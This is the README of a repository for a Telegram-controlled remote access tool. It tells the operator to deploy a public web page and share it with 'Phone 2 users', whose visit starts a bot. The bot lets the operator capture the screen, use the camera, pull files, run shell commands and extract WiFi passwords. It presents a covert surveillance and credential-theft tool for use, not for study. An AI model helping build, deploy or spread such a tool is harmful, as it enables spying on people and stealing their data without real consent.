# 📱 Phone 2 Control Interface

## 🎯 What This Does:
- **Phone 2**: Runs this web interface and Telegram bot
- **Phone 1**: Controls Phone 2 through Telegram commands
- **Result**: You can control Phone 2 from your Telegram app on Phone 1!

## 🚀 How It Works:

### Step 1: Deploy Phone 2 Interface
1. Deploy this folder to Railway/Netlify
2. Get public URL like: `https://your-app.railway.app`
3. Share this URL with Phone 2 users

### Step 2: Phone 2 Connects
1. Phone 2 user visits your public URL
2. Clicks "Connect Phone 2" button
3. Telegram bot starts on Phone 2
4. Phone 2 is now ready to be controlled

### Step 3: Phone 1 Controls
1. You (Phone 1) open Telegram
2. Find your bot: @Manipalhebbal_Bot
3. Send commands like:
   - `/screen` - Take screenshot of Phone 2
   - `/webcam` - Use Phone 2's camera
   - `/sys` - Get Phone 2's system info
   - `/ls` - List Phone 2's files
   - And many more!

## 🌐 Deploy to Public Link:

### Option 1: Railway (Recommended)
1. Go to [railway.app](https://railway.app)
2. Sign up with GitHub
3. Create new project
4. Connect to your repository: `arunaussie7/phone-2`
5. Deploy automatically

### Option 2: Netlify
1. Go to [netlify.com](https://netlify.com)
2. Sign up with GitHub
3. Connect to your repository: `arunaussie7/phone-2`
4. Deploy automatically

## 📁 Files:
- `app.py` - Web interface for Phone 2 to connect
- `start.py` - Startup script
- `control.py` - Telegram bot that runs on Phone 2
- `requirements.txt` - Dependencies
- `Procfile` - For Railway deployment
- `runtime.txt` - Python version

## 🎮 Commands You Can Use (from Phone 1):
- `/start` - Get help and command list
- `/screen` - Capture Phone 2's screen
- `/webcam` - Take photo with Phone 2's camera
- `/sys` - Get Phone 2's system information
- `/ip` - Get Phone 2's IP address
- `/ls` - List files on Phone 2
- `/cd [folder]` - Navigate folders on Phone 2
- `/upload [file]` - Download files from Phone 2
- `/shell [command]` - Execute commands on Phone 2
- `/wifi` - Get WiFi passwords from Phone 2
- And many more!

## 🌍 After Deployment:
You'll get a public URL like:
- Railway: `https://your-app.railway.app`
- Netlify: `https://your-app.netlify.app`

**Share this URL with Phone 2 users to let them connect!**

## 🔧 Local Testing:
```bash
python start.py
```
Then open: http://localhost:5000

---

**Now Phone 1 can control Phone 2 through Telegram! 🎮**
